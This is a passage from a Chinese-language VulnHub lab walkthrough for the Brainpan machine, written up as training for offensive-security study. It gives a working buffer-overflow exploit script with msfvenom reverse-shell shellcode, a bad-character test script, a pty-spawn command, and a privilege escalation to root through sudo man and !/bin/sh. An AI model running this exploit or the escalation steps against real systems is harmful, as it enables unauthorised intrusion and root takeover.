title="确定返回地址"></a>确定返回地址</h3><p>通过构造发送的字符串，EIP覆盖为想要跳转执行的代码。<br>当EIP执行”jmp esp”时，程序会接下来跳转到esp所指向的内存执行，实际上就是“返回地址”在栈里的上一个地址，由于操作系统保护机制，esp的地址是不能写死的，所以要找到程序中有没有“jmp esp”的地址可以利用。<br>这里要用到Immunity Debugger的mona插件，下载地址：<a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a></p><p>安装好后，在debugger下方的指令框中输入！mona modules，它会显示出所有运行程序的保护机制开启情况。选择前四项都为false的程序，就是可进行代码地址利用的程序。</p><p><img src="/posts/229625f/image-20221102092810528.png"></p><p>看到brainpan.exe程序可以利用，使用nasm_shell来获得jmp esp的十六进制指令：</p><p><img src="/posts/229625f/image-20221102092838800.png"></p><p>为”\xff\xe4”，使用mona来寻找指令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>mona <span class="token function">find</span> <span class="token parameter variable">-s</span> <span class="token string">"<span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xe4">\xe4</span>"</span> <span class="token parameter variable">-m</span> brainpan.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102092928811.png"></p><p>找到了指令的位置为0x311712f3<br>因为brainpan为windows 32位小端序，所以传入EIP的值应该为\xf3\x12\x17\x31</p><h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><p>在生成shellcode前，要确定程序中有哪些“坏字符”，即不能作为代码使用的字符，每个程序中是不一样的，要在生成shellcode时避免这些字符导致的反弹shell失败。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> sockethost<span class="token operator">=</span><span class="token string">'192.168.71.146'</span>port<span class="token operator">=</span><span class="token number">9999</span>badchars <span class="token operator">=</span> <span class="token punctuation">(</span>        <span class="token string">b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x00"</span>        <span class="token string">b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10"</span>        <span class="token string">b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20"</span>        <span class="token string">b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30"</span>        <span class="token string">b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x40"</span>        <span class="token string">b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50"</span>        <span class="token string">b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60"</span>        <span class="token string">b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70"</span>        <span class="token string">b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80"</span>        <span class="token string">b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90"</span>        <span class="token string">b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0"</span>        <span class="token string">b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0"</span>        <span class="token string">b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0"</span>        <span class="token string">b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0"</span>        <span class="token string">b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0"</span>        <span class="token string">b"\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0"</span><span class="token punctuation">)</span>buff <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">524</span> <span class="token operator">+</span> <span class="token string">b'aaaa'</span> <span class="token operator">+</span> badcharss <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在esp处右键“follow in dump”中可以看到填入的badchars，但是发现在”\x00”处被截断了，不是本来的”\x11”，说明”\x00”是坏字符。<br>将”\x00”改成”\x01”再次发送，经过排查一切正常，没有其他的坏字符了。</p><p>利用kali的msfvenom生成shellcode，记得加-b参数排除掉坏字符。<br>直接生成靶机linux系统的shellcode。</p><p><img src="/posts/229625f/image-20221102093030822.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>发送给靶机，再加一段nop雪橇保护shellcode。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> socketip <span class="token operator">=</span> <span class="token string">"192.168.71.145"</span>port <span class="token operator">=</span> <span class="token number">9999</span>addr <span class="token operator">=</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>buf <span class="token operator">=</span>  <span class="token string">b""</span>buf <span class="token operator">+=</span> <span class="token string">b"\xdb\xc4\xd9\x74\x24\xf4\xb8\x81\xbe\x52\xf0\x5e\x2b"</span>buf <span class="token operator">+=</span> <span class="token string">b"\xc9\xb1\x12\x83\xee\xfc\x31\x46\x13\x03\xc7\xad\xb0"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x05\xf6\x0a\xc3\x05\xab\xef\x7f\xa0\x49\x79\x9e\x84"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x2b\xb4\xe1\x76\xea\xf6\xdd\xb5\x8c\xbe\x58\xbf\xe4"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x80\x33\x78\x7f\x68\x46\x87\x6e\x35\xcf\x66\x20\xa3"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x9f\x39\x13\x9f\x23\x33\x72\x12\xa3\x11\x1c\xc3\x8b"</span>buf <span class="token operator">+=</span> <span class="token string">b"\xe6\xb4\x73\xfb\x27\x26\xed\x8a\xdb\xf4\xbe\x05\xfa"</span>buf <span class="token operator">+=</span> <span class="token string">b"\x48\x4b\xdb\x7d"</span>buff <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">524</span> <span class="token operator">+</span> <span class="token string">b'\xf3\x12\x17\x31'</span> <span class="token operator">+</span> <span class="token string">b"\x90"</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> bufs <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Payload send complete!"</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发送完成后，kali收到来自靶机的连接，成功反弹shell！</p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>可以用下面的命令切换成tty.不然的话会没有上下文环境，很多命令执行不了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"__import__('pty').spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102093155747.png"></p><p>从反弹的shell中可以看到当前权限为名为punk的用户。<br><strong>sudo -l 命令</strong>：查看授权的命令列表<br>可以看到&#x2F;home&#x2F;anansi&#x2F;bin&#x2F;anansi_util 命令可以无密码执行。</p><p><img src="/posts/229625f/image-20221102093222310.png"></p><p>执行一下这个命令</p><p><img src="/posts/229625f/image-20221102093320764.png"></p><p>依次执行看了一下，三个参数分别相当于以下命令</p><ul><li>ip a&#x2F;ipconfig 命令</li><li>top</li><li>man</li></ul><p>利用man命令进行权限提升，先执行man，再执行!&#x2F;bin&#x2F;sh，获得root权限。</p><p><img src="/posts/229625f/image-20221102093633412.png"></p><p>查看root文件夹下的证明文件b.txt</p><p><img src="/posts/229625f/image-20221102093708826.png"></p><p><strong>恭喜VulnHub的第一台靶机完成！！！！</strong></p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>此靶机考察的点：</p><ul><li>缓冲区溢出漏洞利用</li><li>linux命令</li><li>提权基础</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
